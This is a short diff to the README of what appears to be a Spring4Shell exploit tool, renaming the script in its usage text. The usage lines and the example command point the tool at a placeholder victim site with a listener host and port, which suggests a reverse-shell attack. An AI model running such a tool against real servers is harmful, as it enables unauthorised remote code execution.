@@ -5,8 +5,8 @@ Welcome to the Jerry Spring4Shell show!
 # Usage:
 
 ```
-python3 spring4shell.py -h                                     
-usage: spring4shell.py [-h] -u URL -l LHOST -p PORT
+python3 jerry-springer.py -h                                     
+usage: jerry-springer.py [-h] -u URL -l LHOST -p PORT
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -19,7 +19,7 @@ optional arguments:
   # Example: 
   
   ```
-$ python3 spring4shell.py -u hxxps://victimsite.com -l 127.0.0.1 -p 4443
+$ python3 jerry-springer.py -u hxxps://victimsite.com -l 127.0.0.1 -p 4443
 ```
 
 ```
